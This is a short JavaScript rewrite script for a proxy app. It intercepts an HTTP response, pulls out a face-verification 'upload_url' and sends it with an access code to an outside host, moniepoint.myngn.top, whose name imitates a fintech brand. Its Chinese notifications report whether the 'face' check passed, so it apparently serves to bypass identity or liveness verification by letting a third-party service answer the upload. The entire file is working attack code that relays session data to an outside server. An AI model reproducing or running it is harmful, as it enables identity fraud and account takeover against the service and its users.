let body = $response.body;
let obj = JSON.parse(body);
let upload_url = obj.upload_url;


if (upload_url) {
  $httpClient.get('https://moniepoint.myngn.top/api/receive_data', {
      headers: {
        "Host": "moniepoint.myngn.top",
        "upload_url": upload_url,
        "code": $argument
      },
      timeout: 60
  }, function (error, response, data) {
      if (error) {
          $notification.post("请求失败", "", "人脸失败");
          $done({});
      } else {
          if (response.status === 200) {
              $notification.post("人脸通过", "", "验证成功");
              $done({});
          } else {
              $notification.post("人脸失败", "", "验证失败");
              $done({});
          }
      }
  });
} else {
    $notification.post("上传URL缺失", "响应体中未找到upload_url", "");
    $done({});
}
